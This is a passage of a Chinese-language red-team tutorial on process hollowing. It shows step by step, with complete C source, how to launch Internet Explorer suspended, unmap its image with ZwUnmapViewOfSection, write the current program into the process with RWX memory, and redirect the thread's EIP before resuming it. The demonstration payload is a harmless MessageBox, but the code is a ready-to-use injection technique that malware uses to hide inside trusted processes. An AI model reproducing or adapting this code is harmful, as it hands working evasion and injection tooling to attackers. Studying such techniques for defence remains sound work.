            printf("Create IE successfully!\n\n");
        }
        else
        {
            printf("Create IE failed\n\n");
        }
        return bRet;
    }
然后使用内核api`ZwUnmapViewOfSection`卸载创建这个基质内存空间的数据，这里先看下`ZwUnmapViewOfSection`的结构
    NTSTATUS   ZwUnmapViewOfSection(
        IN HANDLE  ProcessHandle,
        IN PVOID  BaseAddress    );
这个函数在`wdm.h`里面声明，那我们使用`ntdll.dll`将这个api加载进来
    ZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
然后使用`GetModuleHandleA`获取模块基址
    HMODULE hModuleBase = GetModuleHandleA(NULL);
使用`GetCurModuleSize`获取映像大小
    DWORD dwImageSize = GetCurModuleSize((DWORD)hModuleBase);
每个线程内核对象都维护着一个CONTEXT结构，里面保存了线程运行的状态，线程也就是eip，
这样可以使CPU可以记得上次运行该线程运行到哪里了，该从哪里开始运行，所以我们要先获取线程上下文的状态，使用到`GetThreadContext`
    Thread.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(pi.hThread, &Thread);
下一步我们需要知道程序的基址，这里我用到PEB结构和`ReadProcessMemory`来获取，首先看下PEB的结构
    root> dt_peb
    nt!_PEB
    +0x000 InheritedAddressSpace : UChar
    +0x001 ReadImageFileExecOptions : UChar
    +0x002 BeingDebugged     : UChar
    +0x003 BitField          : UChar
    +0x003 ImageUsesLargePages : Pos 0, 1 Bit
    +0x003 SpareBits         : Pos 1, 7 Bits
    +0x004 Mutant            : Ptr32 Void
    +0x008 ImageBaseAddress : Ptr32 Void
`ImageBaseAddress`在+0x008这个位置，所以这个地方`ReadProcessMemory`的参数就是PEB+8
    DWORD GetRemoteProcessImageBase(DWORD dwPEB)
    {
        DWORD dwBaseAddr;
        ReadProcessMemory(pi.hProcess, (LPVOID)(dwPEB + 8), &dwBaseAddr, sizeof(DWORD), NULL);
        return dwBaseAddr;
    }
使用`ZwUnmapViewOfSection`来卸载空间数据
    ZwUnmapViewOfSection(pi.hProcess, (LPVOID)dwRemoteImageBase);
卸载完空间数据之后，用`VirtualAllocEx`重新为我们创建的进程申请一块空间
    VirtualAllocEx(pi.hProcess, hModuleBase,dwImageSize,MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE);
然后使用`WriteProcessMemory`写入
    WriteProcessMemory(pi.hProcess, hModuleBase, hModuleBase, dwImageSize, NULL);
在写入完成之后使用`GetThreadContext`，设置获取标志为 CONTEXT_FULL，即获取新进程中所有的线程上下文
    ThreadCxt.ContextFlags = CONTEXT_FULL;
然后修改eip指向我们自己的函数地址，这里写一个MessageBox
    DWORD GetNewOEP()
    {
        return (DWORD)MessageBox;   
    }
    void MessageBox()
    {
        MessageBoxA(0, "Inject successfully", "", 0);   
    }
    Threadna.Eip = GetNewOEP();
完整代码如下
    #include 
    #include 
    #include 
    using namespace std;
    typedef long NTSTATUS;
    typedef NTSTATUS(__stdcall* pfnZwUnmapViewOfSection)(
        IN HANDLE ProcessHandle,
        IN LPVOID BaseAddress
        );
    pfnZwUnmapViewOfSection ZwUnmapViewOfSection;
    PROCESS_INFORMATION pi = { 0 };
    BOOL CreateEXE()
    {
        wchar_t wszIePath[] = L"C:\\Program Files\\Internet Explorer\\iexplore.exe";
        STARTUPINFO si = { 0 };
        si.cb = sizeof(si);
        BOOL bRet;
        bRet = CreateProcessW(NULL,wszIePath,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi);
        if (bRet)
        {
            printf("[*] Create process successfully!\n\n");
        }
        else
        {
            printf("[!] Create process failed\n\n");
        }
        return bRet;
    }
    DWORD GetCurModuleSize(DWORD dwModuleBase)
    {
        PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)dwModuleBase;
        PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(dwModuleBase + pDosHdr->e_lfanew);
        return pNtHdr->OptionalHeader.SizeOfImage;
    }
    DWORD GetRemoteProcessImageBase(DWORD dwPEB)
    {
        DWORD dwBaseRet;
        ReadProcessMemory(pi.hProcess, (LPVOID)(dwPEB + 8), &dwBaseRet, sizeof(DWORD), NULL);
        return dwBaseRet;
    }
    void Mess()
    {
        MessageBoxA(0, "Inject successfully", "", 0);
    }
    DWORD GetNewOEP()
    {
        return (DWORD)Mess;
    }
    int _tmain(int argc, _TCHAR* argv[])
    {
        ZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
        printf("[*] ZwUnmapViewOfSection address is : 0x%08X\n\n", ZwUnmapViewOfSection);
        if (!ZwUnmapViewOfSection)  
        {
            printf("[!] ZwUnmapViewOfSection failed\n\n");
            exit(1);
        }
        if (!CreateEXE())   
        {
            printf("[!] Create Process failed\n\n");
            exit(1);
        }
        printf("[*] The process PID is : %d\n\n", pi.dwProcessId);
        HMODULE hModuleBase = GetModuleHandleA(NULL);
        DWORD dwImageSize = GetCurModuleSize((DWORD)hModuleBase);
        CONTEXT Thread;
        Thread.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(pi.hThread, &Thread);
        DWORD dwRemoteImageBase = GetRemoteProcessImageBase(Thread.Ebx);
        ZwUnmapViewOfSection(pi.hProcess, (LPVOID)dwRemoteImageBase);
        LPVOID lpAllocAddr = VirtualAllocEx(pi.hProcess, hModuleBase, dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (lpAllocAddr)
        {
            printf("[*] VirtualAllocEx successfully!\n\n");
        }
        else
        {
            printf("[!] VirtualAllocEx failed\n\n");
            return FALSE;
        }
        if (NULL == ::WriteProcessMemory(pi.hProcess, hModuleBase, hModuleBase, dwImageSize, NULL))
        {
            printf("[!] WriteProcessMemory failed\n\n");
            return FALSE;
        }
        else
        {
            printf("[*] WriteProcessMemory successfully!\n\n");
        }
        Thread.ContextFlags = CONTEXT_FULL;
        Thread.Eip = GetNewOEP();
        SetThreadContext(pi.hThread, &Thread);
        if (-1 == ResumeThread(pi.hThread))
        {
            printf("[!] ResumeThread failed\n\n");
            return FALSE;
        }
        else
        {
            printf("[*] ResumeThread successfully!\n\n");
        }
    }
# 实现效果
到这我们的函数就已经成功了，运行一下弹出了messagebox，证明傀儡进程创建成功
欢迎关注公众号 **红队蓝军**